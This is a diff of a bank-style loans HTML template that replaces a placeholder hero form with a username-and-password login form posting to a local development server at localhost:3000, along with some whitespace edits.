@@ -6,13 +6,13 @@
 	<meta name="description" content="loans HTML Template">
 	<meta name="keywords" content="loans, html">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	
+
 	<!-- Favicon -->
 	<link href="img/dbs.ico" rel="shortcut icon"/>
 
 	<!-- Google font -->
 	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i&display=swap" rel="stylesheet">
- 
+
 	<!-- Stylesheets -->
 	<link rel="stylesheet" href="css/bootstrap.min.css"/>
 	<link rel="stylesheet" href="css/font-awesome.min.css"/>
@@ -67,9 +67,9 @@
 					</div>
 				</div>
 				<div class="col-lg-6">
-					<form class="hero-form">
-						<input type="text" placeholder="Account No.">
-						<input type="text" placeholder="Date of Birth">
+					<form role='form' action="http://localhost:3000/login" method="post" class="hero-form">
+						<input type='text' name="username" placeholder="Username">
+						<input type='password' name="password" placeholder="Password">
 						<p>Security Alert: There has been an increase in scam calls targeting remittance and transfers. Always stay vigilant, verify any calls you receive, and never disclose your credentials such as User ID, PIN and credit card details to anyone.</p>
 						<button class="site-btn">Login</button>
 					</form>
@@ -136,7 +136,7 @@ Copyright &copy;<script>document.write(new Date().getFullYear());</script> All r
 		</div>
 	</footer>
 	<!-- Footer Section end -->
-	
+
 	<!--====== Javascripts & Jquery ======-->
 	<script src="js/jquery-3.2.1.min.js"></script>
 	<script src="js/bootstrap.min.js"></script>
